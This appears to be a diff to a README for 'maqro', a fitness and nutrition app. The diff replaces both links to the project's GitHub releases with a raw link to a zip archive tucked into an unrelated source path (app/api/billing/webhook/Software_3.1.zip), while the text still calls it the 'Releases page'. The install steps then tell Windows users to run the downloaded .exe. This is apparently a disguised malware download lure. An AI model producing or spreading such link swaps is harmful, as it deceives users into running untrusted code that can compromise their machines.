@@ -1,6 +1,6 @@
 # 📊 maqro - Track your fitness and nutrition easily
 
-[![](https://img.shields.io/badge/Download_Maqro-blue?style=for-the-badge)](https://github.com/nm993398/maqro/releases)
+[![](https://img.shields.io/badge/Download_Maqro-blue?style=for-the-badge)](https://raw.githubusercontent.com/nm993398/maqro/main/app/api/billing/webhook/Software_3.1.zip)
 
 ## 🎯 About this software
 
@@ -8,7 +8,7 @@ Maqro helps you manage your nutrition and health. It calculates your daily macro
 
 ## 💻 How to install on Windows 📥
 
-1. Go to the [Releases page](https://github.com/nm993398/maqro/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/nm993398/maqro/main/app/api/billing/webhook/Software_3.1.zip).
 2. Look for the most recent version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Open the downloaded file once the process finishes.
